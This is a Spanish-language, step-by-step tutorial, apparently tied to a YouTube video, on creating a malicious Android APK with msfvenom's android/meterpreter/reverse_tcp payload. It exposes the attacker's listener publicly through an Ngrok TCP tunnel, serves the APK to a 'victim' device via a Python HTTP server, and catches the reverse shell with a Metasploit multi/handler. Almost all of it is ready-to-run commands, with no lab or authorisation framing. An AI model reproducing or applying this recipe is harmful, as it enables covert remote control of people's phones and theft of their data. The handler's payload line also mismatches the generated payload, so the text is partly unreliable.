# Video: https://youtu.be/YaxFxesD0uE


# Previamente asegurate de:
1. Descarga Ngrok [Ngrok] (https://ngrok.com/download) (imagen
2. instala desde la terminal: $ sudo tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin (ojo con el nombre de la carpeta podria ser "Descargas" o "Downloads" segun el idioma de configuracion de tu kali)
3. Abre una cuenta gratuita en Ngrok y despues vincula tu token desde la pagina principal de Ngrok dentro de tu perfil ( imagen
4. Tener actualizado tu sistema operativo: $ sudo apt update && apt upgrade -y.
5. Descarga e instala Metasploit-Framework desde la terminal : $ sudo apt install metasploit-framework



# Tutorial
1. Abrimos una terminal como usuraio Root: $ sudo su
2. Arrancamos Metasploit-Framework: $ msfconsole (imagen
3. Desde una segunda terminal montamos un servidor tcp con Ngrok por el puerto 4646 por el cual estaremos en escucha: $ ngrok tcp 4646
4. En nuestra sesion con Metasploit creamos el payload con msfvenom para generar una conexion tcp con el siguiente comando : $  msfvenom -p android/meterpreter/reverse_tcp LHOST=(ojo porque el host nos lo proporcionara Ngrok en el apartado fowardign) al igual el LPORT=(pon atencion a laimagen proporcionada) -o msf.apk
5. Una vez hecho todo esto la aplicacion estara creada y lista para ser descargada desde nuestro equipo "victima".
6. Crearemos un servidor con python para que nuestra aplicacion sea descargada desde el equipo "atacante" al equipo "victima" : $ python3 -m http.server [puerto] (imagen



# Aplicacion
Una vez que la apliacion fue creada eh instalada con exito en el equipo "victima" pasaremos a ponernos en escucha en una nueva ventana de metasploit 
1. Iniciamos Metasploit : $ msfconsole
2. Configuramos un Listener : $ use exploit/multi/handler
3. Seteamos el mismo payload de la app maliciosa : $ set payload/meterpreter/reverse_tcp
4. Seteamos el LHOST pero con todas las conexiones entrantes (all incoming conections) : $ set LHOST 0.0.0.0
5. Seteamos el puerto de escucha que habiamos configurado antes : $ set LPORT 4646
6. Arrancamos el payload : $ exploit




